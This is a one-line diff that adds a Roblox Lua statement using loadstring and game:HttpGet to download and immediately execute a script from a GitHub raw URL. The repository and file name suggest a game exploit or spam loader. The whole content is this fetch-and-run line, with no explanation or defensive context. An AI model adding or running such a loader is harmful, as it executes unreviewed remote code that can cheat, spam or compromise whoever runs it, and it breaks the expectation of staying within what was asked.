@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/fathom-horror-spam7-d6zlvkfyodcgm7.lua"))()
